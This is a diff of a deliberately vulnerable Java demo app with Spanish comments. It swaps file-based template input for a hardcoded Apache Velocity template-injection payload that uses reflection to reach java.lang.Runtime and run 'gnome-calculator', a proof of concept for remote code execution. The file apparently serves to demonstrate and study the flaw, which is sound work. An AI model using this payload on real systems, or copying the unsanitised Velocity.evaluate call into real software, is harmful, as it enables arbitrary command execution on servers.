@@ -19,29 +19,24 @@ public class VulnerableApp {
         context.put("username", "Mundo");
 
         StringWriter writer = new StringWriter();
-        
+
         // La llamada vulnerable ahora usa directamente el contenido que le pasamos.
         Velocity.evaluate(context, writer, "logTag", templateContent);
-        
+
         System.out.println("[+] Plantilla renderizada con éxito:");
         System.out.println(writer.toString());
     }
 
     /**
      * El método main ahora es solo un "envoltorio" para la ejecución normal
-     * desde la línea de comandos. Lee el fichero y llama a nuestro método principal.
+     * desde la línea de comandos. Lee el fichero y llama a nuestro método
+     * principal.
      */
     public static void main(String[] args) throws Exception {
-        if (args.length != 1) {
-            System.err.println("Uso: java -jar <jar_file> <fichero_plantilla.vm>");
-            return;
-        }
-        
-        String templateFile = args[0];
-        System.out.println("[+] Renderizando plantilla desde: " + templateFile);
-        
-        String templateContent = new String(Files.readAllBytes(Paths.get(templateFile)));
-        
+        String templateContent = "#set($exp=$username.getClass().forName(\"java.lang.Runtime\").getRuntime())\n"
+                + "#set($cmd=\"gnome-calculator\")\n"
+                + "$exp.exec($cmd)";
+
         // Llama a la lógica principal
         processTemplate(templateContent);
     }
